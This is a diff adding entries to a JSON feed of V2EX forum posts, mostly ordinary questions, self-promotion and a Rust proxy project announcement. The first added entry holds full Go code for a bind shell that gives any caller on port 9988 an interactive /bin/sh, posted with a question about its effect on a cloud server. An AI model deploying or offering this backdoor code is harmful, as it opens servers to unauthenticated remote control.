@@ -4,6 +4,41 @@
   "Description": "",
   "Items": [
     {
+      "Title": "这段代码放到服务器，是什么后果？如果是阿里云会直接报警，封掉服务器？ - Go 编程语言",
+      "Link": "https://www.v2ex.com/t/929790",
+      "Description": "\u003cpre\u003e\u003ccode class=\"language-go\"\u003efunc main() {\n\n\tlistener, err := net.Listen(\"tcp\", \":9988\")\n\tif err != nil {\n\t\tlog.Fatalln(\"Unable to bind to port\")\n\t}\n\tlog.Println(\"Listening on 0.0.0.0:9988\")\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tlog.Println(\"Received connection\")\n\t\tif err != nil {\n\t\t\tlog.Fatalln(\"Unable to accept connection\")\n\t\t}\n\n\t\tgo handle_pipe(conn)\n\t}\n}\nfunc handle_pipe(conn net.Conn) {\n\tcmd := exec.Command(\"/bin/sh\", \"-i\")\n\n\trp, wp := io.Pipe() \n\tcmd.Stdin = conn    \n\tcmd.Stdout = wp    \n\tgo io.Copy(conn, rp)\n\n\tif err := cmd.Run(); err != nil {\n\t\tlog.Fatalln(err)\n\t}\n}\n\n\u003c/code\u003e\u003c/pre\u003e\n",
+      "Author": "gitxuzan",
+      "PubDate": "2023-04-04T09:22:34Z"
+    },
+    {
+      "Title": "如何看待哲学上的：无用之用才是大用？ - 问与答",
+      "Link": "https://www.v2ex.com/t/929789",
+      "Description": "",
+      "Author": "freepoint",
+      "PubDate": "2023-04-04T09:22:33Z"
+    },
+    {
+      "Title": "最近这几天招人的是不是多起来了？还是我的错觉？ - 职场话题",
+      "Link": "https://www.v2ex.com/t/929788",
+      "Description": "前阵子站里都没多少招人的，这两天一天能刷出好几个来",
+      "Author": "yukirus",
+      "PubDate": "2023-04-04T09:21:31Z"
+    },
+    {
+      "Title": "发现更好用的 Mac 应用 - macOS",
+      "Link": "https://www.v2ex.com/t/929787",
+      "Description": "对于喜欢 Mac 电脑的用户来说，寻找好用的 Mac 应用是一个永恒的话题。如果你也希望有一个推荐好用 Mac 应用的平台，那么就来关注优 APPER 公众号吧！我们致力于为你推荐最新的、最实用的 Mac 应用，并分享使用技巧，让你的 Mac 电脑更加好用！\u003cbr /\u003e我们的推荐不仅仅局限于热门应用，还包括一些小众但非常实用的 Mac 应用。比如，你可能不知道有一款可以帮你快速截屏并进行编辑的工具；或者，你可能不知道有一款可以帮你管理你的密码和账号的应用。这些小众但非常实用的 Mac 应用，都能够让你的 Mac 电脑应用更加个性化、更加实用。\u003cbr /\u003e除了推荐应用，我们还会分享一些使用技巧和小技巧，让你更好地使用你的 Mac 电脑和应用。无论你是新手还是老手，我们都会为你提供最合适的推荐和使用技巧。\u003cbr /\u003e快来关注优 APPER 公众号，让我们一起发现更多好用的 Mac 应用吧！",
+      "Author": "studentBB",
+      "PubDate": "2023-04-04T09:17:29Z"
+    },
+    {
+      "Title": "我开发了一个代理服务器，性能和 Nginx 差不多。 - 分享创造",
+      "Link": "https://www.v2ex.com/t/929786",
+      "Description": "\u003ch1\u003e项目地址\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e项目在\u003ca href=\"https://github.com/lsk569937453/silverwind\" rel=\"nofollow\"\u003e这里\u003c/a\u003e。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e特点\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e速度快,性能测试在\u003ca href=\"https://github.com/lsk569937453/silverwind/blob/main/benchmarks.md\" rel=\"nofollow\"\u003e这里\u003c/a\u003e。性能测试条件是在 Docker Swarm 中，使用 Docker Compose 部署服务(代理+后端+压测工具)，同时限制服务使用的 cpu 和内存(目前的限制是 4 核 cpu 和 8G 内存)。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过 Rest Api 实时修改配置(5 秒内生效)。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e涵盖了 Api 网关的所有功能(IP 黑白名单 /授权 /熔断,限流 /路由 /负载均衡)。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过 Rust 语言开发，理论上支持所有平台。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e用户界面友好（此处有吹牛嫌疑🙈），docker 容器下[代理+控制面]一键启动,docker-compose.yaml 文件在\u003ca href=\"https://github.com/lsk569937453/silverwind/blob/main/docker/dashboard/docker-compose.yaml\" rel=\"nofollow\"\u003e这里\u003c/a\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e性能测试图\u003c/h1\u003e\n\u003cp\u003e防止有些大佬们看不到性能对比图，直接把图贴在下面了。\u003cbr/\u003e\nps:我也不知道为什么 Caddy 性能差这么多。Caddy 的配置在\u003ca href=\"https://github.com/lsk569937453/silverwind/tree/main/benchmarks/caddy\" rel=\"nofollow\"\u003e这里\u003c/a\u003e。\u003c/p\u003e\n\u003ch2\u003eResults using Hey\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"alt tag\" class=\"embedded_image\" loading=\"lazy\" referrerpolicy=\"no-referrer\" rel=\"noreferrer\" src=\"https://raw.githubusercontent.com/lsk569937453/image_repo/main/requestForSecond.png\"/\u003e\n\u003cimg alt=\"alt tag\" class=\"embedded_image\" loading=\"lazy\" referrerpolicy=\"no-referrer\" rel=\"noreferrer\" src=\"https://raw.githubusercontent.com/lsk569937453/image_repo/main/average-response-time.png\"/\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"alt tag\" class=\"embedded_image\" loading=\"lazy\" referrerpolicy=\"no-referrer\" rel=\"noreferrer\" src=\"https://raw.githubusercontent.com/lsk569937453/image_repo/main/Latency%20distribution.png\"/\u003e\u003c/p\u003e\n\u003ch1\u003e附加\u003c/h1\u003e\n\u003ch2\u003e界面有点丑陋😂，毕竟不是专业前端，请轻拍！\u003c/h2\u003e\n\u003ch2\u003e希望路过的大佬们，给个 star 吧😍！\u003c/h2\u003e\n",
+      "Author": "lsk569937453",
+      "PubDate": "2023-04-04T09:15:39Z"
+    },
+    {
       "Title": "免费使用 GPT-4,一个月 200k token 免费额度，支持 Markdown， Markdoc， MDX， HTML - 分享发现",
       "Link": "https://www.v2ex.com/t/929785",
       "Description": "\u003cp\u003e发现一个可以免费 GPT-4 的网站，\u003ca href=\"https://markprompt.com/\" rel=\"nofollow\"\u003ehttps://markprompt.com/\u003c/a\u003e ，而且也开源了，感兴趣的可以玩玩。关注我 \u003ca href=\"https://t.me/webexplorers\" rel=\"nofollow\"\u003ehttps://t.me/webexplorers\u003c/a\u003e 及时收到更多有用的信息。\u003c/p\u003e\n",
